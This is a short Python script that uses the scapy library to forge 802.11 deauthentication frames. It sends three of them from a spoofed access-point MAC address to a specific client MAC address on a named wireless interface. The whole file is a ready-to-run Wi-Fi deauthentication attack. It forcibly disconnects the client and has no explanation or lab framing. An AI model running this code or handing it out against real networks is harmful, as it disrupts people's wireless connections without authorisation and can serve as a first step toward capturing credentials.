from scapy.layers.dot11 import *

dot11 = Dot11(addr1="40:45:da:ad:9b:12", addr2="c8:47:19:64:92:4a", addr3="c8:47:19:64:92:4a")
packet = RadioTap()/dot11/Dot11Deauth(reason=7)

sendp(packet, iface="wlp6s0f4u2", count=3, inter=0.1, verbose=1)